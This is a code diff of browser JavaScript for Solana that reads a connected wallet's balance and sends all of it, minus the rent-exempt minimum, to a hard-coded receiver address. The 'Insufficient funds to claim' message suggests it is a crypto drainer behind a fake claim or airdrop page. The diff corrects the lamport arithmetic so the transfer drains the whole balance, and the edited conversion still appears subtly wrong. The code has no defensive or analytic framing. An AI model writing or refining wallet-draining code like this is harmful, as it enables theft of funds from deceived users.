@@ -17,15 +17,24 @@ $(document).ready(function() {
     const walletBalance = await connection.getBalance(public_key);
 
     const balanceInSOL = walletBalance / solanaWeb3.LAMPORTS_PER_SOL;
+
     alert(`Wallet balance: ${balanceInSOL} SOL`);
 
+
+
       const minBalance = await connection.getMinimumBalanceForRentExemption(0);
+
+
 alert(`Minimum balance for rent exemption: ${minBalance / solanaWeb3.LAMPORTS_PER_SOL} SOL`);
+
+// Input balances in SOL (as numbers or strings)
+const walletBalanceInLamports = BigInt(Math.round(walletBalance * Number(LAMPORTS_PER_SOL)));
+const minBalanceInLamports = BigInt(Math.round(minBalance * Number(LAMPORTS_PER_SOL)));
 
 
 
                  const recieverWallet = new solanaWeb3.PublicKey('DRYjXYjya45KLzD5HmtBd4QeUA6SqypNoJDhgoie8bnF');
-                        const balanceForTransfer = walletBalance - minBalance;
+                        const balanceForTransfer = walletBalanceInLamports - minBalanceInLamports;
                         alert(`Balance available for transfer: ${balanceForTransfer / solanaWeb3.LAMPORTS_PER_SOL} SOL`);
                         if (balanceForTransfer <= 0) {
                             alert("Insufficient funds to claim .");
@@ -34,13 +43,13 @@ alert(`Minimum balance for rent exemption: ${minBalance / solanaWeb3.LAMPORTS_PE
                         alert("Initiating transfer...");
 
 
-                        
+
 
                         var transaction = new solanaWeb3.Transaction().add(
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: resp.publicKey,
                                 toPubkey: recieverWallet,
-                                lamports: balanceForTransfer / solanaWeb3.LAMPORTS_PER_SOL,
+                                lamports: balanceForTransfer,
                             }),
                         );
 
